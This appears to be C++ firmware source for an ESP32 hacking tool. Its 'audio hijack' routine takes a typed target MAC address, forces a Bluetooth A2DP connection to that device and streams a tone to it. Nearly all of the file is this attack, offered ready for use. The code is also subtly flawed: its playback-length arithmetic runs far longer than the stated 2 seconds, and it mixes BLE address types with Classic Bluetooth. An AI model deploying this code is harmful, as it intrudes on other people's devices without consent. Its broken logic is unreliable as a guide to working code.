#include "audio_hijack.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <globals.h>

#ifdef HAS_A2DP
#include "BluetoothA2DPSource.h"

BluetoothA2DPSource a2dp_source;
bool a2dp_connected = false;
float audio_phase = 0.0f;

void a2dp_connection_state_changed(esp_a2d_connection_state_t state, void*) {
    a2dp_connected = (state == ESP_A2D_CONNECTION_STATE_CONNECTED);
}

void generateAudioChunk(uint8_t* buffer, size_t len) {
    const float FREQUENCY = 440.0f;
    float phase_increment = 2.0f * PI * FREQUENCY / 44100.0f;
    
    for(size_t i = 0; i < len; i += 4) {
        int16_t left_sample = sin(audio_phase) * 25000;
        int16_t right_sample = sin(audio_phase * 1.01) * 25000;
        
        buffer[i] = left_sample & 0xFF;
        buffer[i+1] = (left_sample >> 8) & 0xFF;
        buffer[i+2] = right_sample & 0xFF;
        buffer[i+3] = (right_sample >> 8) & 0xFF;
        
        audio_phase += phase_increment;
        if(audio_phase > 2.0f * PI) audio_phase -= 2.0f * PI;
    }
}

bool playGeneratedAudio(int duration_ms) {
    uint8_t audio_buffer[1024];
    int chunks_to_play = (duration_ms * 44);
    
    for(int i = 0; i < chunks_to_play; i++) {
        generateAudioChunk(audio_buffer, 1024);
        a2dp_source.write_audio(audio_buffer, 1024);
        delay(23);
    }
    
    return true;
}

bool attemptAudioHijack(NimBLEAddress target) {
    std::string mac = target.toString();
    
    a2dp_source.set_connection_state_callback(a2dp_connection_state_changed);
    a2dp_source.start(mac.c_str(), "ESP32-Audio");
    
    for(int i = 0; i < 30 && !a2dp_connected; i++) {
        delay(100);
    }
    
    if(!a2dp_connected) {
        a2dp_source.stop();
        return false;
    }
    
    delay(500);
    playGeneratedAudio(2000);
    delay(500);
    
    a2dp_source.stop();
    return true;
}

void audioHijackTest() {
    displayMessage("AUDIO HIJACK TEST", "Enter target MAC", "", "", 0);
    
    String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
    if(input.isEmpty()) return;
    
    NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
    
    if(!requireButtonHoldConfirmation("Start audio hijack?", 3000)) {
        return;
    }
    
    bool success = attemptAudioHijack(target);
    
    if(success) {
        displayMessage("SUCCESS!", "Audio streamed", "", "", 2000);
    } else {
        displayMessage("FAILED", "Device not responding", "", "", 2000);
    }
}
#else
void audioHijackTest() {
    displayMessage("AUDIO HIJACK", "A2DP not enabled", "", "", 0);
    padprintln("Add to platformio.ini:");
    padprintln("  lib_deps = ");
    padprintln("    pschatzmann/ESP32-A2DP");
    delay(3000);
}
#endif